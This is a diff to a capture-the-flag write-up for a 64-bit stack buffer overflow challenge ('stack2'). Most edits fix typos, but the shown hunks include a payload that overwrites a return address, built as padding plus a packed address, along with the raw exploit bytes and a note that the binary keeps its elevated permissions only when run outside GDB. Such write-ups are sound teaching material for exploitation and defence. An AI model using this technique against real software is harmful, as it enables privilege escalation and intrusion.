@@ -1,6 +1,6 @@
 # stack2
 
-## inital poke:
+## Inital Exlporation
 
 ``` bash
 $ cd /problems/stack2r-64_7_6f3f38bb74a66565cc9342709dadda5e/
@@ -12,7 +12,7 @@ $ pwn checksec ./stack2-64
     PIE:      PIE enabled
 ```
 
-- This is in little endian,
+- This is in little endian
 - has PIE enabled
 
 ## Code analysis
@@ -70,7 +70,7 @@ exploit_str = b"A" * offset + p64(0x5555555547aa)
 
 ## It works! Now what?
 
-- We need to run the file directly, and manually input the exploit string.
+- We need to run the file directly, and manually input the exploit string. This is due to the binary running with different permissions than it would get via GDB
 - To get the converted string, enter the python3 enviornment and run the code for our exploit stirng crafting. we will get
 `b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xaaGUUUU\x00\x00'`
 
